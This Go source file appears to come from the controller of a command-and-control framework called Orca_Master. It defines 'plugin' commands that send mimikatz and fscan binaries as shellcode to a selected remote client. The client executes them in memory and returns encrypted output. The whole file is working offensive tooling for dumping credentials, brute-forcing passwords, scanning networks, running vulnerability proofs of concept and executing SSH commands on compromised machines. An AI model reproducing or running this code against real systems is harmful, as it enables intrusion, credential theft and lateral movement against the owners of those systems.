package controller

import (
	"Orca_Master/cli/cmdopt/execopt"
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/cmdopt/pluginopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"fmt"
	"github.com/desertbit/grumble"
	"strings"
	"time"
)

var pluginCmd = &grumble.Command{
	Name:  "plugin",
	Help:  "load plugin (mimikatz｜fscan)",
	Usage: "plugin mimikatz|fscan [-h | --help]",
}

var mimikatzCmd = &grumble.Command{
	Name: "mimikatz",
	Help: "  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36\n" +
		" .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n" +
		" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n" +
		" ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n" +
		" '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n" +
		"  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\n" +
		"execute mimikatz in memory",
	Usage: "plugin mimikatz [-h | --help] <params>",
	Args: func(a *grumble.Args) {
		a.StringList("params", "parameters of mimikatz")
	},
	Completer: func(prefix string, args []string) []string {
		return filterStringWithPrefix(pluginopt.MimikatzOptions, prefix)
	},
	Run: func(c *grumble.Context) error {
		if SelectVer[:7] != "windows" {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "mimikatz is not supported on non-Windows systems")
		}
		var file string
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		if SelectVer[len(SelectVer)-5:] == "amd64" {
			file = "3rd_party/windows/plugin/x64/mimikatz.bin"
		} else {
			file = "3rd_party/windows/plugin/Win32/mimikatz.bin"
		}
		paramList := c.Args.StringList("params")
		params := strings.Join(paramList, " ")
		params = "mimikatz " + params + " exit"
		if !fileopt.IsLocalFileLegal(file) {
			return nil
		}

		// 发送shellcode元信息
		data := pluginopt.GetShellcodeMetaInfo(file, params)
		retData := pluginopt.SendShellcodeMetaMsg(SelectClientId, data)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "shellcode load failed")
			return nil
		}
		// 分片发送文件
		execopt.SendFileData(SelectClientId, file)
		colorcode.PrintMessage(colorcode.SIGN_NOTICE, "executing mimikatz...")
		//接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
			time.Sleep(100 * time.Millisecond)
			return nil
		}
	},
}

var fscanCmd = &grumble.Command{
	Name: "fscan",
	Help: "   ___                              _\n" +
		"  / _ \\     ___  ___ _ __ __ _  ___| | __\n" +
		" / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n" +
		"/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <\n" +
		"\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n" +
		"                     fscan version: 1.8.1\n\n" +
		"execute fscan in memory",
	Usage: "plugin fscan [-h | --help] [-H | -host host] <params>",
	Flags: func(f *grumble.Flags) {
		f.IntL("br", 1, "Brute threads")
		f.String("c", "cmd", "", "exec command (ssh)")
		f.StringL("cookie", "", "set poc cookie,-cookie rememberMe=login")
		f.IntL("debug", 60, "every time to LogErr")
		f.BoolL("dns", false, "using dnslog poc")
		f.StringL("domain", "", "smb domain")
		f.BoolL("full", false, "poc full scan,as: shiro 100 key")
		f.String("H", "hosts", "", "IP address of the host you want to scan,for example: 192.168.11.11 ｜ 192.168.11.11-255 ｜ 192.168.11.11,192.168.11.12")
		f.StringL("hn", "", "the hosts no scan,as: -hn 192.168.1.1/24")
		f.String("m", "module", "", "Select scan type ,as: -m ssh (default \"all\")")
		f.BoolL("nobr", false, "not to Brute password")
		f.BoolL("nopoc", false, "not to scan web vul")
		f.BoolL("np", false, "not to ping")
		f.IntL("num", 20, "poc rate")
		f.String("p", "ports", "", "Select a port,for example: 22 ｜ 1-65535 ｜ 22,80,3306 (default \"21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017\")")
		f.StringL("pa", "", "add port base DefaultPorts,-pa 3389")
		f.StringL("path", "", "fcgi,smb romote file path")
		f.BoolL("ping", false, "using ping replace icmp")
		f.StringL("pn", "", "the ports no scan,as: -pn 445")
		f.StringL("pocname", "", "use the pocs these contain pocname, -pocname weblogic")
		f.StringL("proxy", "", "set poc proxy, -proxy http://127.0.0.1:8080")
		f.StringL("pwd", "", "password")
		f.StringL("pwda", "", "add a password base DefaultPasses,-pwda password")
		f.StringL("user", "", "username")
		f.StringL("usera", "", "add a user base DefaultUsers,-usera user")
		f.IntL("wt", 5, "Set web timeout")
	},
	Run: func(c *grumble.Context) error {
		var file string
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		if SelectVer[:7] == "windows" {
			if SelectVer[len(SelectVer)-5:] == "amd64" {
				file = "3rd_party/windows/plugin/x64/fscan.bin"
			} else {
				file = "3rd_party/windows/plugin/Win32/fscan.bin"
			}
		}
		if SelectVer[:5] == "linux" {
			if SelectVer[len(SelectVer)-5:] == "amd64" {
				file = "3rd_party/linux/plugin/amd64/fscan_amd64"
			} else {
				file = "3rd_party/linux/plugin/386/fscan_386"
			}
		}
		var params string
		hosts := c.Flags.String("hosts")
		br := c.Flags.Int("br")
		cmd := c.Flags.String("cmd")
		cookie := c.Flags.String("cookie")
		debug := c.Flags.Int("debug")
		dns := c.Flags.Bool("dns")
		domain := c.Flags.String("domain")
		full := c.Flags.Bool("full")
		hn := c.Flags.String("hn")
		module := c.Flags.String("module")
		nobr := c.Flags.Bool("nobr")
		nopoc := c.Flags.Bool("nopoc")
		np := c.Flags.Bool("np")
		num := c.Flags.Int("num")
		ports := c.Flags.String("ports")
		pa := c.Flags.String("pa")
		path := c.Flags.String("path")
		ping := c.Flags.Bool("ping")
		pn := c.Flags.String("pn")
		pocname := c.Flags.String("pocname")
		proxy := c.Flags.String("proxy")
		pwd := c.Flags.String("pwd")
		pwda := c.Flags.String("pwda")
		user := c.Flags.String("user")
		usera := c.Flags.String("usera")
		wt := c.Flags.Int("wt")

		if hosts != "" {
			params += fmt.Sprintf("-h %s ", hosts)
		}
		if br > 1 {
			params += fmt.Sprintf("-br %d ", br)
		}
		if cmd != "" {
			params += fmt.Sprintf("-c %s ", cmd)
		}
		if cookie != "" {
			params += fmt.Sprintf("-cookie %s ", cookie)
		}
		if debug != 60 {
			params += fmt.Sprintf("-debug %d ", debug)
		}
		if domain != "" {
			params += fmt.Sprintf("-domain %s ", domain)
		}
		if module != "" {
			params += fmt.Sprintf("-m %s ", module)
		}
		if num != 20 {
			params += fmt.Sprintf("-num %d ", num)
		}
		if hn != "" {
			params += fmt.Sprintf("-hn %s ", hn)
		}
		if ports != "" {
			params += fmt.Sprintf("-p %s ", ports)
		}
		if pa != "" {
			params += fmt.Sprintf("-pa %s ", pa)
		}
		if pn != "" {
			params += fmt.Sprintf("-pn %s ", pn)
		}
		if path != "" {
			params += fmt.Sprintf("-path %s ", path)
		}
		if pocname != "" {
			params += fmt.Sprintf("-pocname %s ", pocname)
		}
		if proxy != "" {
			params += fmt.Sprintf("-proxy %s ", proxy)
		}
		if pwd != "" {
			params += fmt.Sprintf("-pwd %s ", pwd)
		}
		if pwda != "" {
			params += fmt.Sprintf("-pwda %s ", pwda)
		}
		if user != "" {
			params += fmt.Sprintf("-user %s ", user)
		}
		if usera != "" {
			params += fmt.Sprintf("-usera %s ", usera)
		}
		if wt != 5 {
			params += fmt.Sprintf("-wt %d ", wt)
		}
		if dns {
			params += fmt.Sprintf("-dns ")
		}
		if full {
			params += fmt.Sprintf("-full ")
		}
		if nobr {
			params += fmt.Sprintf("-nobr ")
		}
		if nopoc {
			params += fmt.Sprintf("-nopoc ")
		}
		if np {
			params += fmt.Sprintf("-np ")
		}
		if ping {
			params += fmt.Sprintf("-ping ")
		}

		params = "fscan " + params + " -no"

		if !fileopt.IsLocalFileLegal(file) {
			return nil
		}

		// 发送shellcode元信息
		data := pluginopt.GetShellcodeMetaInfo(file, params)
		retData := pluginopt.SendShellcodeMetaMsg(SelectClientId, data)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "shellcode load failed")
			return nil
		}

		// 分片发送文件
		execopt.SendFileData(SelectClientId, file)
		colorcode.PrintMessage(colorcode.SIGN_NOTICE, "executing fscan...")

		//接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
			return nil
		}
	},
}
